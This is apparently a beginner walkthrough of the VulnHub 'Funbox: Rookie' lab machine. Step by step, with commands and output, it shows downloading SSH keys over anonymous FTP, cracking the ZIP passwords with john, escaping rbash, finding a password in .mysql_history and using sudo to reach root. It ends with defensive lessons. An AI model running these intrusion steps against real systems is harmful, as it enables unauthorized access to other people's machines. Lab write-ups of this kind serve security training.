# Funbox: Rookie — VulnHub Walkthrough (Beginner Friendly)

> Also known as **Funbox 2**. A short, realistic boot2root: an open FTP server
> leaks password-protected SSH keys, one password is weak, and a forgotten
> command history file hands you the keys to root. Every step is explained.

| Field | Value |
| --- | --- |
| **Machine** | Funbox: Rookie |
| **Difficulty** | Easy |
| **Author** | 0815R2d2 |
| **Released** | 27 July 2020 |
| **VulnHub Entry** | https://vulnhub.com/entry/funbox-rookie,520/ |
| **Download** | https://vulnhub.com/entry/funbox-rookie,520/#download |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux (Ubuntu) |

---

## 0. What you will learn

- How to find a host and scan its ports.
- Why **anonymous FTP** access is dangerous, and how to pull files from it.
- How to turn a **password-protected ZIP** containing an SSH key into a login
  (`zip2john` + `john` + `rockyou.txt`).
- How to log in with an **SSH private key** and escape a **restricted shell**
  (`rbash`).
- How to find credentials in a **`.mysql_history`** file.
- How to abuse a **`sudo` misconfiguration** to become `root`.

**Prerequisites:** Kali Linux with your target VM imported and both on the same
host-only network (attacker `192.168.56.10`, target `192.168.56.101`).

---

## 1. Reconnaissance — finding the target

> **Goal:** confirm the target's IP address on your isolated lab network.

```bash
# What is my attacker IP and subnet?
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

```bash
# List live hosts with ARP (fast, works even if the host blocks ping)
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH   (Kali)
192.168.56.101  08:00:27:11:22:33   PCS Systemtechnik GmbH   (target)
```

**Target IP:** `192.168.56.101`

![arp-scan finding the target](images/01-recon.png)

---

## 2. Enumeration — open ports and services

```bash
# Full TCP sweep, then service detection (note the FTP anon script output)
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 21,22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5e
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--   1 ftp ftp  1477 Jul 25 2020 anna.zip
| -rw-rw-r--   1 ftp ftp  1477 Jul 25 2020 cathrine.zip
| -rw-rw-r--   1 ftp ftp  1477 Jul 25 2020 john.zip
| -r--r--r--   1 ftp ftp  1477 Jul 25 2020 tom.zip
| -rw-r--r--   1 ftp ftp   170 Jan 10 2018 welcome.msg
|_-rw-rw-r--   1 ftp ftp  1477 Jul 25 2020 zlatan.zip
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **How to read it:**
> - The `ftp-anon` script line literally tells us **anonymous login is allowed**
>   — that is our way in.
> - Port **80** is a default Apache page (and `robots.txt` advertises `/logs/`,
>   which is a dead end — the box's "rabbit-hole").

Browsing the web server gives nothing useful, so FTP is the target.

![nmap scan showing anonymous FTP](images/02-nmap.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Grab the files from anonymous FTP

```bash
# Log in as the anonymous user (any e-mail as the password)
ftp 192.168.56.101
# Name: anonymous
# Password: anonymous@example.com
```

```text
230 Anonymous access granted, restrictions apply
ftp> ls -al
-rw-r--r--   1 ftp ftp   153 Jul 25 2020 .@admins
-rw-rw-r--   1 ftp ftp  1477 Jul 25 2020 cathrine.zip
-r--r--r--   1 ftp ftp  1477 Jul 25 2020 tom.zip
-rw-r--r--   1 ftp ftp   114 Jul 25 2020 .@users
-rw-r--r--   1 ftp ftp   170 Jan 10 2018 welcome.msg
ftp> mget *
ftp> bye
```

> **Why it works:** the FTP server is configured to allow the `anonymous`
> account. The hidden `.@admins` / `.@users` messages are hints:
> *"be careful with your keys. Find them in %yourname%.zip."*

### 3.2 Crack the ZIP passwords

Each `.zip` contains an SSH private key (`id_rsa`), but the archives are
password-protected. We convert the ZIP to a crackable hash, then brute-force it
with the `rockyou.txt` wordlist.

```bash
# Convert every .zip to a John-the-Ripper hash format
zip2john *.zip > zips.hash

# Crack with John using rockyou
john --wordlist=/usr/share/wordlists/rockyou.txt zips.hash
john --show zips.hash
```

```text
tom.zip/id_rsa:  iubire       # password cracked; varies by build
cathrine.zip/id_rsa: catwoman
2 password hashes cracked, 9 left
```

> **Why it works:** `zip2john` extracts the encrypted entry's verifier as a hash
> that `john` can attack offline. Weak, dictionary passwords fall in seconds.

```bash
unzip tom.zip          # enter password: iubire
chmod 600 id_rsa
```

### 3.3 Log in with the stolen key

```bash
ssh -i id_rsa tom@192.168.56.101
```

```text
Welcome to Ubuntu ...
Last login: ...
tom@funbox2:~$ id
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),... ,108(lxd)
```

> **Note:** `cathrine`'s key may log straight back out — the hidden `.@users`
> message warned "there may be unexpected problems". Use `tom`'s key.

### 3.4 Escape the restricted shell

```text
tom@funbox2:~$ cd /
-rbash: cd: restricted
```

The account runs a **restricted bash (`rbash`)** — you cannot change directory
or run many commands. Two easy escapes:

```bash
# Option A — re-connect with a full bash (simplest)
ssh -i id_rsa tom@192.168.56.101 -t "bash --noprofile"
```

```bash
# Option B — from inside the shell, spawn bash via Python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> **Why it works:** `rbash` only restricts the shell it starts. Asking SSH to
> run `bash --noprofile` directly, or launching a new shell from Python,
> bypasses the restriction entirely.

![SSH foothold as tom](images/03-foothold.png)

---

## 4. Privilege escalation — becoming root

### 4.1 Find the password in the MySQL history

```bash
ls -la /home/tom
cat /home/tom/.mysql_history
```

```text
_HiStOrY_V2_
show\040databases;
create\040database\040'support';
use\040support
create\040table\040users;
insert\040into\040support\040(tom,\040xx11yy22!);
quit
```

> **Why it works:** the `mysql` client records every command you type into
> `~/.mysql_history`. The admin typed a password into an `INSERT` statement —
> and it is stored in plaintext. `\040` is just an encoded space. This leaks the
> user's password: `xx11yy22!` (`varies by build`).

### 4.2 Check sudo rights

```bash
sudo -l
# password: xx11yy22!
```

```text
User tom may run the following commands on funbox2:
    (ALL : ALL) ALL
```

> **Why it works:** `(ALL : ALL) ALL` means `tom` may run **any** command as
> **any** user — including root. There is no need for a clever GTFOBins trick;
> we simply become root.

```bash
sudo su
id
```

```text
root@funbox2:/home/tom# id
uid=0(root) gid=0(root) groups=0(root)
```

![sudo -l and root shell](images/04-privesc.png)

### 4.3 The root flag

```bash
cd /root
ls
cat flag.txt      # some builds name it proof.txt / root.txt
```

```text
7ca58542dc8a0d0181aaf812ae214c69    # varies by build
```

![root flag](images/05-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Anonymous FTP login enabled | FTP :21 | Disclosure of users' private SSH keys |
| 2 | Weak password-protected ZIP archives | FTP files | Offline cracking exposes `id_rsa` |
| 3 | Plaintext credential in `.mysql_history` | `/home/tom/.mysql_history` | Sudo password for `tom` |
| 4 | Over-broad `sudo` rights (`(ALL:ALL) ALL`) | `sudoers` for `tom` | Full privilege escalation to `root` |

## 6. Defensive lessons (blue team)

- **Disable anonymous FTP.** If it must stay, never store users' private keys
  or archives on it.
- **Never store private keys where the world can read them**, and always
  protect key archives with a *strong, unique* passphrase (not a dictionary
  word from `rockyou.txt`).
- **Scrub shell history.** Educate users (and set `HISTCONTROL`/`HISTIGNORE`)
  so passwords never end up in `.bash_history` or `.mysql_history`.
- **Apply least privilege to `sudo`.** Remove blanket `(ALL:ALL) ALL` grants;
  allow only the exact commands a user needs.
- **Detection:** alert on anonymous FTP logins, bulk `mget`, and any OS user
  obtaining a root shell who does not normally need one.

---

## 7. References

- VulnHub entry: https://vulnhub.com/entry/funbox-rookie,520/
- John the Ripper (`zip2john`): https://github.com/openwall/john
- rockyou.txt wordlist: https://www.kali.org/tools/wordlists/
- rbash escape cheatsheet: https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells
- GTFOBins (sudo escapes): https://gtfobins.github.io/
- Community writeups consulted:
  - [An ordinary day — Vulnhub Funbox2: Rookie](https://blog.gibbons.digital/hacking/2020/10/06/funbox2.html)
  - [PG Play — FunboxRookie](https://writeups.kunull.net/Proving%20Grounds/Play/Easy/FunboxRookie)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with `arp-scan`
- [ ] `images/02-nmap.png` — nmap showing anonymous FTP + ZIP files
- [ ] `images/03-foothold.png` — SSH shell as `tom`
- [ ] `images/04-privesc.png` — `.mysql_history`, `sudo -l`, root shell
- [ ] `images/05-root-flag.png` — `cat /root/flag.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
